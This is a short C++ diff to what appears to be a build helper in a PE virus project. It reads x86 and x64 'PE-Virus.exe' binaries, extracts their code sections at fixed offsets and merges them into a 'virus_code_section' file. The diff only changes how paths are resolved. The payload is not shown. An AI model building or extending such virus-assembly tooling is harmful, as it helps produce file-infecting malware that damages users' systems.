@@ -7,7 +7,18 @@ using namespace std;
 
 int main(int argc, char *argv[]) {
 
-    string p32_path = "file\\virusexe\\x86\\PE-Virus.exe";
+    std::filesystem::path cwd = std::filesystem::current_path();
+    string path = cwd.string();
+    if (path.substr(path.size() - 5, path.size()) == "\\main")
+    {
+        path = path.substr(0, path.size() - 4);
+    }
+    else
+    {
+        return 0;
+    }
+    
+    string p32_path = path + "file\\virusexe\\x86\\PE-Virus.exe";
 
     std::filesystem::path p32{p32_path};
 
@@ -16,7 +27,7 @@ int main(int argc, char *argv[]) {
     ifstream ifs32(p32_path, std::ios_base::binary);
     ifs32.read((char *)&v32[0], std::filesystem::file_size(p32));
 
-    std::string p64_path = "file\\virusexe\\x64\\PE-Virus.exe";
+    std::string p64_path = path + "file\\virusexe\\x64\\PE-Virus.exe";
     std::filesystem::path p64{p64_path};
 
     vector<unsigned char> v64(std::filesystem::file_size(p64));
@@ -29,6 +40,6 @@ int main(int argc, char *argv[]) {
     std::copy (&v32[0x400], &v32[0x400 + 0x1e00], std::back_inserter(merge));
     std::copy (&v64[0x400], &v64[0x400 + 0x2400], std::back_inserter(merge));
 
-    ofstream ofs("file/virusbody/virus_code_section", std::ios_base::binary);
+    ofstream ofs(path + "file\\virusbody\\virus_code_section", std::ios_base::binary);
     ofs.write((char *)&merge[0], merge.size());
 }
